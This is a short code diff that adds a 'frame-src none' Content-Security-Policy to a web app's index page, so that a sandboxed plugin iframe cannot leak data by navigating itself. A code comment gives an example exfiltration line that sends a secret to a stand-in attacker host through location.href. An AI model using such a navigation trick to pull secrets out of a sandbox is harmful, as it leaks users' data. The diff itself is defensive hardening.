@@ -127,8 +127,19 @@ function resolveContentEncoding(
   return { finalFile: resolvedFile, contentEncoding: null };
 }
 
+/**
+ * A sandboxed iframe is always allowed to navigate itself, and no directive in
+ * the *guest's* policy stops it — so a plugin could exfiltrate with
+ * `location.href = "https://evil.tld/?d=" + secret`. A child frame's navigation
+ * is checked against the *parent's* `frame-src`, so the gate has to live on the
+ * app document. `about:srcdoc` is exempt, so the plugin frame still renders.
+ * The app embeds no other frame; see docs/plugins.md "The sandbox".
+ */
+const HOST_CSP = "frame-src 'none'";
+
 function setResponseCacheHeaders(res: Response, isIndexHtml: boolean, resolvedFile: string): void {
   if (isIndexHtml) {
+    res.setHeader("Content-Security-Policy", HOST_CSP);
     res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
     res.setHeader("Pragma", "no-cache");
     res.setHeader("Expires", "0");
